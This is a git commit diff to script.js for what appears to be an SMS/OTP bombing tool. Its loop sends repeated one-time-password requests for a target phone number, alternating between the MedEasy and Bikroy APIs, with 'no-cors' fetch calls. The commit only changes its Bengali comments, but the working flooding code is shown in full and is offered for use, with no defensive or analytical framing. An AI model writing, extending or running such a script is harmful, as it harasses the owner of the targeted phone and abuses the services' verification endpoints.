e5d3178df5511ecf964f6ac437a508ded12f7a16
Hexer X Nova <mrsports15.7.2024@gmail.com>
2026-01-14 23:17:16 +0600

    script.js

--- script.js
+++ script.js
@@ -37,16 +37,16 @@ async function startProcess() {
     
     for (let i = 1; i <= count; i++) {
         try { 
-            // পর্যায়ক্রমে MedEasy এবং Bikroy এপিআই কল হবে
+            // পর্যায়ক্রমে MedEasy এবং Bikroy এপিআই কল করার লজিক
             if (i % 2 !== 0) {
-                // ১. MedEasy API (আপনার দেওয়া ফরম্যাট অনুযায়ী)
+                // ১. MedEasy API
                 await fetch(`https://api.medeasy.health/api/send-otp/+88${target}/`, { 
                     method: 'GET', 
                     mode: 'no-cors',
                     cache: 'no-store'
                 });
             } else {
-                // ২. Bikroy API (আপনার দেওয়া ফরম্যাট অনুযায়ী)
+                // ২. Bikroy API
                 await fetch(`https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${target}`, { 
                     method: 'GET', 
                     mode: 'no-cors',
